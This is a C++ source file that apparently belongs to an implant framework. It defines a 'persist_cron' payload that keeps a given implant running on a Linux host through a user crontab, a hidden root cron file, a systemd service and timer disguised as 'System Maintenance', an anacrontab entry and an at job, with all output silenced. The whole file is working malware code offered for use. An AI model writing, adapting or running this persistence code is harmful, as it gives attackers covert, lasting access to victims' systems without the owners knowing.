#include <sys/stat.h>
#include <unistd.h>

#include <cerrno>
#include <cstring>
#include <string>
#include <vector>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

std::string failed_open(const std::string& path, int err) {
    return "Failed: open " + path + ": " + errno_text(err);
}

std::string failed_cmd(const CmdResult& r) {
    if (!r.err.empty()) return "Failed: " + r.err;
    return "Failed: exit status " + std::to_string(r.exit_code);
}

std::string bool_str(bool b) { return b ? "+" : "-"; }

struct Method {
    std::string type;
    std::string detail;
    bool success = false;
    std::string timestamp;
};

Method new_method(const char* type) { return Method{type, "", false, now_rfc3339()}; }

Method user_cron(const std::string& implant_path) {
    Method m = new_method("user_cron");
    const std::string cron_line = "*/5 * * * * " + implant_path + " 2>/dev/null\n";

    std::string existing = run_cmd_ctx({"crontab", "-l"}, -1).out;

    std::string new_cron = trim(existing);
    if (!new_cron.empty() && new_cron.back() != '\n') new_cron += "\n";
    new_cron += cron_line;

    CmdResult res = mut_run_argv_stdin({"crontab", "-"}, new_cron);
    if (res.ok) {
        m.success = true;
        m.detail = "Added cron: " + trim(cron_line);
    } else {
        m.detail = failed_cmd(res);
    }
    return m;
}

Method system_cron(const std::string& implant_path) {
    Method m = new_method("system_cron");
    if (::geteuid() != 0) {
        m.detail = "Skipped (not root)";
        return m;
    }
    const std::string cron_file = "/etc/cron.d/.system-maintenance";
    const std::string content = "*/5 * * * * root " + implant_path + " 2>/dev/null\n";
    errno = 0;
    if (mut_write(cron_file, content, 0644)) {
        m.success = true;
        m.detail = "Wrote " + cron_file;
    } else {
        m.detail = failed_open(cron_file, errno);
    }
    return m;
}

Method systemd_timer(const std::string& implant_path) {
    Method m = new_method("systemd_timer");
    if (::geteuid() != 0) {
        m.detail = "Skipped (not root)";
        return m;
    }

    const std::string service_content =
        "[Unit]\n"
        "Description=System Maintenance Service\n"
        "After=network.target\n"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=" + implant_path + "\n"
        "Restart=always\n"
        "RestartSec=60\n"
        "StandardOutput=null\n"
        "StandardError=null\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";

    const std::string timer_content =
        "[Unit]\n"
        "Description=Run System Maintenance periodically\n"
        "\n"
        "[Timer]\n"
        "OnBootSec=5min\n"
        "OnUnitActiveSec=10min\n"
        "RandomizedDelaySec=30s\n"
        "\n"
        "[Install]\n"
        "WantedBy=timers.target\n";

    const std::string service_file = "/etc/systemd/system/system-maintenance.service";
    const std::string timer_file = "/etc/systemd/system/system-maintenance.timer";

    errno = 0;
    if (!mut_write(service_file, service_content, 0644)) {
        m.detail = "Failed service: open " + service_file + ": " + errno_text(errno);
        return m;
    }
    errno = 0;
    if (!mut_write(timer_file, timer_content, 0644)) {
        m.detail = "Failed timer: open " + timer_file + ": " + errno_text(errno);
        return m;
    }

    mut_run_argv({"systemctl", "daemon-reload"});
    mut_run_argv({"systemctl", "enable", "--now", "system-maintenance.timer"});

    m.success = true;
    m.detail = "Systemd timer enabled";
    return m;
}

Method anacron(const std::string& implant_path) {
    Method m = new_method("anacron");
    struct stat st;
    if (::stat("/etc/anacrontab", &st) != 0 && errno == ENOENT) {
        m.detail = "No anacrontab found";
        return m;
    }
    const std::string entry =
        "\n# System maintenance\n1\t5\tsystem.maintenance\t" + implant_path + " 2>/dev/null\n";
    errno = 0;
    if (mut_append("/etc/anacrontab", entry, 0644)) {
        m.success = true;
        m.detail = "Added anacron entry";
    } else {
        m.detail = failed_open("/etc/anacrontab", errno);
    }
    return m;
}

Method at_job(const std::string& implant_path) {
    Method m = new_method("at_job");
    std::string at = which_exe("at");
    if (at.empty()) {
        m.detail = "at command not found";
        return m;
    }
    CmdResult res = mut_run_argv_stdin({at, "now", "+", "1", "hour"}, implant_path + " 2>/dev/null\n");
    if (res.ok) {
        m.success = true;
        m.detail = "Scheduled AT job";
    } else {
        m.detail = failed_cmd(res);
    }
    return m;
}

class PersistCron : public Payload {
  public:
    const char* name() const override { return "persist_cron"; }
    const char* category() const override { return "persistence"; }
    const char* description() const override {
        return "Establish persistence via cron, systemd timers, at jobs";
    }

    Output execute(const Args& args) const override {
        std::string implant_path;
        auto it = args.find("implant_path");
        if (it != args.end()) implant_path = it->second;
        if (implant_path.empty()) implant_path = prog_argv0();

        OJ r = OJ::object();
        r["timestamp"] = now_rfc3339();

        std::vector<Method> methods;
        methods.push_back(user_cron(implant_path));
        methods.push_back(system_cron(implant_path));
        methods.push_back(systemd_timer(implant_path));
        methods.push_back(anacron(implant_path));
        methods.push_back(at_job(implant_path));

        OJ ma = OJ::array();
        OJ statuses = OJ::array();
        for (const Method& m : methods) {
            OJ o = OJ::object();
            o["type"] = m.type;
            o["detail"] = m.detail;
            o["success"] = m.success;
            o["timestamp"] = m.timestamp;
            ma.push_back(o);
            statuses.push_back(std::string("[") + bool_str(m.success) + "] " + m.detail);
        }
        r["methods"] = ma;
        r["statuses"] = statuses;

        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

PersistCron g_persist_cron;

struct Reg { Reg() { Register(&g_persist_cron); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
